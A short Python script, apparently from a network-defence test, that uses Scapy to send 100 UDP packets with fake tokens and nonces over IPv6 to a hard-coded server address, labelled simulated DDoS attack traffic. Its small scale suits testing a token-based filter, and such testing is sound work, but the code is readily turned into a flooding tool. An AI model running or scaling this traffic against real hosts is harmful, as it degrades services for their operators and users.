import time
import uuid
from scapy.all import IPv6, UDP, Raw, Ether, sendp, get_if_hwaddr

SERVER_IP = "2a00:23c8:afd9:e101:4d5:e821:5b53:e91f"
SRC_PORT = 9999
DST_PORT = 443
INTERFACE = "en0"  # Replace with the name of the local export network card
NUM_PACKETS = 100
INTERVAL_BETWEEN_PACKETS = 0.005  # Simulate DDoS attacks at a faster pace

# ====== Construct attack traffic (tokenless） ======
print(f"[*] Sending simulated DDoS attack traffic (Group J)...")

for i in range(NUM_PACKETS):
    fake_payload = {
        "PacketToken": "fake_token_" + uuid.uuid4().hex[:8],
        "Nonce": "attack-" + uuid.uuid4().hex[:8],
        "Timestamp": int(time.time())
    }

    pkt = Ether(src=get_if_hwaddr(INTERFACE), dst="ff:ff:ff:ff:ff:ff") / \
          IPv6(dst=SERVER_IP) / \
          UDP(sport=SRC_PORT, dport=DST_PORT) / \
          Raw(load=str(fake_payload).encode())

    sendp(pkt, iface=INTERFACE, verbose=False)

    if (i + 1) % 10 == 0:
        print(f"[+] Sent {i + 1}/{NUM_PACKETS} attack packets.")
    time.sleep(INTERVAL_BETWEEN_PACKETS)

print(f"[✓] DDoS attack traffic simulation completed.")